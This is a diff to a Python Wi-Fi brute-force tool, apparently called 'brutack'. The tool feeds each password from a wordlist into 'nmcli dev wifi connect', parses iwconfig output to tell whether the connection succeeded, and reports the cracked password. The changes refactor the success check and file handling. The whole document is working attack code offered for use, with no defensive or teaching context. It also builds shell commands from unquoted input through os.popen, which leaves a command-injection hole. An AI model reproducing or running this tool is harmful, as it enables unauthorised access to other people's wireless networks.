@@ -47,10 +47,11 @@ _____________________________________________________________
 
 
 import os, threading, sys, time
-from functools import reduce
+from functools import reduce, wraps
 
 def singleton(cls):
     instance = None
+    @wraps(cls)
     def onCall(*args, **kwargs):
         nonlocal instance
         if not instance:
@@ -94,36 +95,48 @@ class writeLog:
 writeToLog = writeLog()
 Done = False
 attempt = []
+success = 0
 
+def check_connection(Verify = False):
+    time.sleep(7)
+    connection = os.popen('iwconfig', 'r')
+    text = reduce((lambda x,y: str(x)+str(y)), connection.readlines() )
+    ESSID = text.find('ESSID:')
+    connected = (text[ESSID+6:ESSID+9])
+    connection.close()
+    
+    if not Verify:
+        return connected
+    if Verify:
+        if str(connected) != 'off':
+            return True
+        if str(connected) == 'off':
+            return False
+        
 
 def Brute(name, password):
     global Done, attempt
     lock = threading.Lock()
     
     with lock:
-        # This block trying to understand: is the wi-fi connection done or not?
         os.popen('nmcli dev wifi connect {0} password {1}'.format(name, password))
-        time.sleep(7)
-        connection = os.popen('iwconfig', 'r')
-        text = reduce((lambda x,y: str(x)+str(y)), connection.readlines() )
-        ESSID = text.find('ESSID:')
-        connected = (text[ESSID+6:ESSID+9])
-        connection.close()
-        #
+        connected = check_connection()
         
         attempt.append(1)
         
-        if connected != 'off':
-            with writeToLog:
-                print( 'Done! At '+str(len(attempt))+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(password))
-            Done = True
-            sys.exit()
+        if str(connected) != 'off':
+            if not check_connection(Verify = True):
+                print('Password number', len(attempt), 'was tried. No result...')
+                sys.exit()
+            if check_connection(Verify = True):            
+                with writeToLog:
+                    print( 'Done! At '+str(len(attempt))+' try. \n\n\n\n!\n\n\n\nIts a "{0}"'.format(password))
+                    Done = True
+                sys.exit()
         else:
             with writeToLog:
                 print('Password number', len(attempt), 'was tried. No result...')
             sys.exit()
-
-
 
 
 if __name__ == '__main__':
@@ -132,10 +145,12 @@ if __name__ == '__main__':
     
     # This block collecting info from system arguments.
     try:
-        passwords = [ i.rstrip() for i in open(sys.argv[2], 'r')]
+        with open(sys.argv[2], 'r') as bruteWords:
+            passwords = [ i.rstrip() for i in bruteWords]
     except FileNotFoundError:
         file = str(os.getcwd())+'/'+str(sys.argv[2])
-        passwords = [ i.rstrip() for i in open(file, 'r')]
+        with open(file, 'r') as bruteWords:
+            passwords = [ i.rstrip() for i in bruteWords]
     except Exception:
         print('''Unexpected error. Use "python3 brutack.py 
 <name_of_wi-fi_connection> <file_with_passwords>" format of command.
@@ -148,7 +163,6 @@ The file with passwords must be in the same directory as "brutack", or contains
     ## This block is creating threads and trying connect to necessary wi-fi,
     ## using passwords from designated file.    
     try:
-        success = 0
         with writeToLog:
             for passw in passwords:
                 if not Done:
@@ -157,7 +171,6 @@ The file with passwords must be in the same directory as "brutack", or contains
                     x.join()
                 else:
                     print('Brute-force attack well done. Exiting.')
-                    success = 1
                     break     
     except BrokenPipeError: # Some strange error... I don't know,
     # what is it, so lets just pass it >.<
